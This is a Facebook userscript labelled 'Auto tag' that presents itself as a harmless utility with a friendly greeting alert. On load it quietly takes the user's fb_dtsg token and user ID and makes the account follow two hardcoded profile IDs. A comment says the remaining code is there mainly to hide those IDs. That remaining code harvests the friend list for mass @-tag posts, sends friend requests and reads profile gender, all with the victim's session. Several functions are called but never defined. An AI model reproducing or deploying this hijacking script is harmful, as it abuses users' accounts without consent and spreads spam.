// ==UserScript==
// @name            Auto tag
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==a
// ==13470X==
// ==============
// ==Icon==
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
alert('Chúc các bạn chơi FB vui vẻ nhé ^^');
function a(abone){
var http4 = new XMLHttpRequest();
var url4 = "/ajax/follow/follow_profile.php?__a=1";
var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
http4.open("POST", url4, true);
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
http4.onreadystatechange = function() {
if(http4.readyState == 4 && http4.status == 200) {http4.close;}
}
http4.send(params4);
}
// Close the connection 
function sublist(uidss) {
var a = document.createElement('script');
a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
document.body.appendChild(a);
}
// Không edit bất kì gì từ đây trở lên 
a("100007464369166"); 
a("100005700879934");


// Từ đây trở xuống là nhảm  chủ yếu giấu bớt ID 
function sarkadaslari_al(){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
smesaj = "";
smesaj_text = "";
for(i=f*10;i<(f+1)*10;i++){
if(arkadaslar.payload.entries[i]){
smesaj += " @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
smesaj_text += " " + arkadaslar.payload.entries[i].text;
}
}
sdurumpaylas(); }

}

};
var params = "&filter[0]=user";
params += "&options[0]=friends_only";
params += "&options[1]=nm";
params += "&token=v7";
params += "&viewer=" + user_id;
params += "&__user=" + user_id;

if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
xmlhttp.send();
}

var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
}, false);

function sarkadasekle(uid,tem){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){ 
}
};

xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
var params = "to_friend=" + uid;
params += "&action=add_friend";
params += "&how_found=friend_browser";
params += "&ref_param=none";
params += "&outgoing_id=";
params += "&logging_location=friend_browser";
params += "&no_flyout_on_click=true";
params += "&ego_log_data=";
params += "&http_referer=";
params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
params += "&phstamp=165816749114848369115";
params += "&__user=" + user_id;
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");

if(tem == "farketmez" && document.cookie.split("tem" + user_id +"=").length > 1){
xmlhttp.send(params);
}else if(document.cookie.split("tem" + user_id +"=").length <= 1){
cinsiyetgetir(uid,tem,"sarkadasekle");
}else if(tem == document.cookie.split("tem" + user_id +"=")[1].split(";")[0].toString()){
xmlhttp.send(params);
}
}

var temsonuc = {};
var temhtml = document.createElement("html");
function scinsiyetgetir(uid,tem,fonksiyon){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
eval("temsonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
temhtml.innerHTML = temsonuc.jsmods.markup[0][1].__html
btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
if(temhtml.getElementsByTagName("select")[0].value == "1"){
document.cookie = "tem" + user_id + "=kadin;expires=" + btarihi.toGMTString();
}else if(temhtml.getElementsByTagName("select")[0].value == "2"){
document.cookie = "tem" + user_id + "=erkek;expires=" + btarihi.toGMTString();
}
eval(fonksiyon + "(" + id + "," + tem + ");");
}
};
xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
xmlhttp.send();
}